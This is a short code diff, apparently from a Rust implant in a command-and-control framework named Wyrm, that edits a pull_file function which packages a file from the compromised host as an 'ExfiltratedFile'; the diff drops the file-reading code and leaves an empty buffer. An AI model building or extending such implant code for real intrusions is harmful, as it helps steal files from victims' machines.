@@ -464,7 +464,7 @@ fn parse_path(
 pub fn pull_file(
     file_path_str: &str,
     implant_working_dir: &PathBuf,
-) -> WyrmResult<impl Serialize + use<>> {
+) -> WyrmResult<ExfiltratedFile> {
     // Validate and parse the path we received
     let file_path = match parse_path(file_path_str, implant_working_dir, PathParseType::File) {
         WyrmResult::Ok(p) => p,
@@ -476,30 +476,7 @@ pub fn pull_file(
         }
     };
 
-    let mut f = match File::open(&file_path) {
-        Ok(f) => f,
-        Err(e) => {
-            #[cfg(debug_assertions)]
-            println!("Failed to open file {file_path}, {e}");
-
-            return WyrmResult::Err(e.to_string());
-        }
-    };
-
-    let mut buf: Vec<u8> = if f.metadata().is_ok() {
-        Vec::with_capacity(f.metadata().unwrap().len() as usize)
-    } else {
-        Vec::new()
-    };
-
-    if let Err(e) = f.read_to_end(&mut buf) {
-        #[cfg(debug_assertions)]
-        println!("Error reading file data for {file_path}. {e}");
-
-        return WyrmResult::Err(e.to_string());
-    }
-
-    let ef = ExfiltratedFile::new(get_hostname(), file_path, buf);
+    let ef = ExfiltratedFile::new(get_hostname(), file_path, vec![]);
 
     WyrmResult::Ok(ef)
 }
